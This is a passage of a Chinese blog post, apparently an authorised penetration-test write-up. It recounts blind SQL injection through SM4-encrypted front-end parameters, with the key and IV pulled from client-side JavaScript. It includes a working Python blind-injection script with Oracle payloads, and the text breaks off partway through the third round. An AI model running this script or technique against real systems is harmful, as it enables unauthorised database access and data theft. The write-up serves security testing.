@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="原文首发先知：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;8071针对JS参数加密的一次尝试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次sm4前端参数加密下的sql盲注">
+<meta property="og:url" content="http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="九指">
+<meta property="og:description" content="原文首发先知：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;8071针对JS参数加密的一次尝试">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/00-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/01-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%84%9A%E6%9C%AC%E7%9B%B2%E6%B3%A8.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/02-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/03-%E6%89%BE%E5%88%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/04-javasm4%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/05-%E7%9B%B2%E6%B3%A8%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E8%A1%A8.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/一次sm4前端参数加密下的sql盲注/06-盲注获取owner表数量.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/07-%E7%AC%AC%E4%B8%89%E6%AC%A1%E6%8A%93%E5%8C%85.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/08-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0url%E8%AF%B7%E6%B1%82%E4%BD%8D%E7%BD%AE.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/09-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/12-%E5%AF%B9%E6%AF%94%E6%98%8E%E6%96%87%E5%AF%86%E6%96%87.png">
+<meta property="og:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/13-py%E8%B0%83%E7%94%A8js%E5%AE%9E%E7%8E%B0SM4.png">
+<meta property="article:published_time" content="2020-04-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-28T01:38:39.582Z">
+<meta property="article:author" content="ninefiger">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="加密解密">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.ninefiger.top/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/00-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>一次sm4前端参数加密下的sql盲注</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="九指" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/link">链接</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/08/10/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2019/07/03/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&text=一次sm4前端参数加密下的sql盲注"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&is_video=false&description=一次sm4前端参数加密下的sql盲注"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一次sm4前端参数加密下的sql盲注&body=Check out this article: http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&title=一次sm4前端参数加密下的sql盲注"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&name=一次sm4前端参数加密下的sql盲注&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/&t=一次sm4前端参数加密下的sql盲注"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">0x01 第一次常规测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%82%E6%95%B0%E4%BD%BF%E7%94%A8SM4%E5%8A%A0%E5%AF%86"><span class="toc-number">3.</span> <span class="toc-text">0x02 第二次参数使用SM4加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%AC%AC%E4%B8%89%E6%AC%A1JS%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E9%9A%90%E8%97%8F%E5%AF%86%E9%92%A5"><span class="toc-number">4.</span> <span class="toc-text">0x03 第三次JS加密混淆隐藏密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        一次sm4前端参数加密下的sql盲注
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ninefiger</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-30T16:00:00.000Z" itemprop="datePublished">2020-05-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/" rel="tag">加密解密</a>, <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><hr>
+<p>&emsp;&emsp;在一次授权渗透测试中，应用在前端使用sql语句拼接方式传送参数，很明显存在sql注入，提交漏洞后，用户大概不想重构项目，于是将前端参数传输前均进行加密，但是通过JS找到加密密钥后，结合py脚本还是注入了；后续用户再次升级将设计加密的JS也加密混淆了，不过还有办法找到密钥，借此分享，过程中踩坑绕弯，欢迎大表哥们交流指导。</p>
+<h3 id="0x01-第一次常规测试"><a href="#0x01-第一次常规测试" class="headerlink" title="0x01 第一次常规测试"></a>0x01 第一次常规测试</h3><ol>
+<li><p>如下图点击功能抓数据包，可以发现参数中明显有SQL语句，后使用1=1 和 1=2 确定了注入点，但是没有返回值，只能盲注了。。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/00-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95.png" alt="00-第一次常规测试"></p>
+</li>
+<li><p>py写个脚本，简单爆破了一下数据库长度、数据库名等信息<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/01-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%84%9A%E6%9C%AC%E7%9B%B2%E6%B3%A8.png" alt="01-第一次脚本盲注"></p>
+</li>
+</ol>
+<h3 id="0x02-第二次参数使用SM4加密"><a href="#0x02-第二次参数使用SM4加密" class="headerlink" title="0x02 第二次参数使用SM4加密"></a>0x02 第二次参数使用SM4加密</h3><ol>
+<li><p>接到复测通知，看了下系统，发现参数被加密了，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/02-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86.png" alt="02-第二次参数加密"></p>
+</li>
+<li><p>这里找加密方法的图没截，大概就是找到对应的ajax方法，可以看到md5_bean参数的生成通过base.js的encryptData_ECB方法生成，打开base.js清晰可见sm4字样以及secretkey和iv，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/03-%E6%89%BE%E5%88%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95.png" alt="03-找到加密算法"></p>
+</li>
+<li><p>接下来是如何注入，本来想构造一个sqlmap的tamper脚本，但是发现这个是把所有参数一起加密了，没得思路了，于是还是用py写盲注脚本吧，但是网上找的python实现sm4加密的结果都不一样，考虑到这个后台是java的，肯定是java做的解密，于是找了java的sm4实现，试了一下，结果可以了，于是尝试用py调用打包好的jar包进行注入（这里绕了一个大圈，实际上使用py调用js就行，第三次测试的时候更新了）</p>
+</li>
+</ol>
+<p><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/04-javasm4%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.png" alt="04-javasm4加密解密"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   <span class="keyword">import</span> json</span><br><span class="line">   <span class="keyword">import</span> os</span><br><span class="line">   <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">   </span><br><span class="line">   header = &#123;</span><br><span class="line">       <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">   pay = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._!@#$%^&amp;*()&#x27;</span></span><br><span class="line">   </span><br><span class="line">   proxies = &#123;</span><br><span class="line">       <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">#request构造请求，传入data中的_searchWhere</span></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">payload</span>):</span></span><br><span class="line">       url = <span class="string">&quot;http://&quot;</span></span><br><span class="line">       data = <span class="string">&quot;&#123;\&quot;_searchWhere\&quot;:\&quot; %s\&quot;,\&quot;title\&quot;:\&quot;\&quot;,\&quot;paramsFlag\&quot;:\&quot;false\&quot;,\&quot;parVar\&quot;:\&quot;\&quot;,\&quot;frameId\&quot;:\&quot;=\&quot;,\&quot;readOnly\&quot;:\&quot;\&quot;,\&quot;extWhere\&quot;:\&quot;\,\&quot;type\&quot;:\&quot;\&quot;,\&quot;parWhere\&quot;:\&quot;\&quot;,\&quot;dataFlag\&quot;:\&quot;\&quot;&#125;&quot;</span> % payload</span><br><span class="line">       data = quote(data,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">       command = <span class="string">&quot;java -Dmoudle=e -Dstr=%s -jar sm4Decode.jar&quot;</span> % data</span><br><span class="line">       data_sm4 = <span class="string">&quot;&quot;</span>.join(os.popen(command).readlines())</span><br><span class="line">       data_send = &#123;<span class="string">&quot;md5_bean&quot;</span>:data_sm4&#125;</span><br><span class="line">       cookies = &#123;<span class="string">&quot;&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">       result = requests.post(url=url, data=data_send, cookies=cookies, headers=header ,proxies=proxies)</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">len</span>(result.text)</span><br><span class="line">   <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">       <span class="comment"># 判断数据库</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">           payload = <span class="string">&quot;and (select length(name) from v$database)=%s&quot;</span> % <span class="built_in">str</span>(i)</span><br><span class="line">           <span class="built_in">print</span>(payload)</span><br><span class="line">           lenstr = attack(payload)</span><br><span class="line">           <span class="keyword">if</span> lenstr &gt; <span class="number">3000</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br><span class="line">               <span class="built_in">print</span>(<span class="string">&quot;数据库长度是%s&quot;</span>% <span class="built_in">str</span>(i))</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               <span class="built_in">print</span>(lenstr)</span><br></pre></td></tr></table></figure>
+<p>4.此时客户疑问，这个sql注入1=1 1=2返回结果是不同、暴露一个数据库版本等信息又有什么用，于是多注了一点信息，证明危害，获取用户表名的过程比较啰嗦，这里只有是结果图。<br>a. 用户表数据<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/05-%E7%9B%B2%E6%B3%A8%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E8%A1%A8.png" alt="05-盲注获取用户表"></p>
+<p>b. owner表数量</p>
+<img src="/img/一次sm4前端参数加密下的sql盲注/06-盲注获取owner表数量.png" alt="06-盲注获取owner表数量" style="zoom:33%;" />
+
+<h3 id="0x03-第三次JS加密混淆隐藏密钥"><a href="#0x03-第三次JS加密混淆隐藏密钥" class="headerlink" title="0x03 第三次JS加密混淆隐藏密钥"></a>0x03 第三次JS加密混淆隐藏密钥</h3><ol>
+<li><p>最后一次复测，用户表示已经没问题了，让再看一下，由于时间有点长，重新找一下加密算法位置</p>
+<p>使用抓包抓到的URL，在chrome调试工具中search一下位置，打下断点，点击功能看一下是否触发断点。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/07-%E7%AC%AC%E4%B8%89%E6%AC%A1%E6%8A%93%E5%8C%85.png" alt="07-第三次抓包"><br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/08-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0url%E8%AF%B7%E6%B1%82%E4%BD%8D%E7%BD%AE.png" alt="08-调试找到url请求位置"></p>
+</li>
+<li><p>接下来一步一步跟下去，找到参数构造md5_bean参数的位置<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/09-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0.png" alt="09-调试找到参数构造"></p>
+</li>
+<li><p>next找到base64.js，发现代码已经压缩而且加密了。。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p>
+</li>
+<li><p>遇到JS加密了如果有实力的大佬可以解密js或者 <a target="_blank" rel="noopener" href="https://www.sojson.com/jsobfuscator.html">https://www.sojson.com/jsobfuscator.html</a> 付费解密，不过只是想得到密钥和iv的话，可以在断点进入base64.js后，调试窗口肯定会显示密钥和iv值，因为不管怎么混淆，代码还是要被正常执行的。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/11-%E8%B0%83%E8%AF%95%E6%89%BE%E5%88%B0secretKey.png" alt="11-调试找到secretKey"></p>
+</li>
+<li><p>接下来又是注入了，之前用的脚本思路太麻烦了，这次简单点，直接调SM4加密的js，由于这段js已经混淆了，于是从网上找来base64.js的源码简单改了一下，使用python的execjs调用加密。</p>
+</li>
+</ol>
+<p>a. java解开加密内容如图</p>
+<p><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/12-%E5%AF%B9%E6%AF%94%E6%98%8E%E6%96%87%E5%AF%86%E6%96%87.png" alt="12-对比明文密文"></p>
